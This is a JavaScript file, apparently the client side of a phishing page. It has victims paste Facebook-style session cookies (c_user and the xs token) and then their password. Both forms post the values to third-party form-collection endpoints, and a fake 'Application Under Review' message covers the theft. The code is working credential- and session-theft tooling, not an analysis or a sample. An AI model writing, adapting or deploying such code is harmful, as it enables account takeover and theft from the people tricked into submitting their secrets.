
function showPage(pageId) {
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    document.getElementById(pageId).classList.add('active');
}

// Configure FormSpark form submissions
const cookieForm = document.getElementById('cookieForm');
const passwordForm = document.getElementById('passwordForm');

cookieForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const cuserInput = document.getElementById('cuser');
    const xsInput = document.getElementById('xs');
    
    // Validate c_user (must be numbers only)
    if (!/^\d+$/.test(cuserInput.value)) {
        alert('c_user must contain only numbers');
        return;
    }
    
    // Validate xs (must not be empty)
    if (!xsInput.value.trim()) {
        alert('xs token is required');
        return;
    }

    // Submit form data in background
    fetch('https://submit-form.com/wvGvlIWs9', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            cuser: cuserInput.value,
            xs: xsInput.value
        })
    }).then(() => {
        showPage('page4');
    }).catch(error => {
        console.error('Error:', error);
        showPage('page4'); // Still proceed to password page
    });
});

passwordForm.addEventListener('submit', function(e) {
    e.preventDefault();
    const button = e.target.querySelector('button');
    button.textContent = 'Processing...';
    
    fetch('https://submit-form.com/Pn6Mi2Nat', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            passwrod: document.getElementById('passwrod').value
        })
    }).then(() => {
        const thankYouMessage = document.createElement('div');
        thankYouMessage.innerHTML = `
            <h2>Thank You! Application Under Review</h2>
            <p style="margin-top: 1rem; color: #666;">Please wait 24 hours for your verification results.</p>
        `;
        thankYouMessage.style.textAlign = 'center';
        thankYouMessage.style.marginTop = '2rem';
        
        const form = document.querySelector('.confirm-identity form');
        form.innerHTML = '';
        form.appendChild(thankYouMessage);
    }).catch(error => {
        console.error('Error:', error);
        alert('An error occurred. Please try again.');
        button.textContent = 'Continue';
    });
});
